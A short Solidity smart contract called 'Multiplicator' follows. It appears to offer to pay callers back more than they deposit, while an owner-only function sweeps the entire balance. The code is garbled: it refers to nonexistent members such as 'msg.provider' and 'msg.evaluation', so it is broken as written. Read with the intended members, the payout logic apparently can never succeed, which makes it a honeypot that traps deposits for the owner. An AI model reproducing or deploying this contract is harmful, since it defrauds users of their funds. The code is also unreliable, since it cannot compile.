pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.provider;

    function()payable{}

    function withdrawBenefits()
    payable
    public
    {
        require(msg.provider == Owner);
        Owner.transfer(this.balance);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.evaluation>=this.balance)
        {
            adr.transfer(this.balance+msg.evaluation);
        }
    }
}